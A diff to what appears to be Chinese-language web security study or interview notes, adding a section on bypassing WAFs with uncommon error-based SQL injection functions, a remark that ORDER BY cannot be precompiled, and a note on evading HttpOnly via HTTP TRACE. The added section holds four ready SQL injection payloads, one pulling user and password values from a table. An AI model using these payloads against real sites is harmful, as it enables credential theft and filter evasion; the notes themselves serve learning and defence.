@@ -99,6 +99,16 @@ Access: msyobjects
 
 报错注入一般用 updatexml 和 extractvalue，用 floor 也可以
 
+#### 冷门报错注入函数绕 waf
+
+    1' and (select 1 from (select count(*),concat((select schema_name from information_schema.schemata limit 0,1),0x2b,floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1
+
+    and multipoint((select * from(select * from(select version())a)b))
+
+    and geometrycollection((select * from(select * from(select version())a)b))
+
+    or exp(~(select * from (select (concat(0x7e,(SELECT GROUP_CONCAT(user,':',password) from manage),0x7e))) as asd))
+
 #### 宽字节注入的原理和条件是什么
 
 如果网站在用户输入的引号前面加了反斜杠进行转义，而网站使用 gbk 编码，则 sql 注入点符合宽字节注入的条件。
@@ -155,6 +165,10 @@ sha1，md5
 
 （2）网络传输层面：配置 waf 进行拦截，不把带有 payload 的语句传输到后端。
 
+#### order by 能预编译吗
+
+不能，只能加 waf
+
 ### xss
 
 #### xss 的原理
@@ -168,6 +182,10 @@ sha1，md5
 #### xss 绕 waf
 
 常用绕过方法：双写大小写、编码、找没被禁用的标签、没被禁用的事件、不常见的语句
+
+#### httponly 的绕过
+
+有些接口会返回 set-cookie；用 ajax 或 flash 进行 http trace 攻击可以回显 cookie。
 
 #### 防御 xss
 
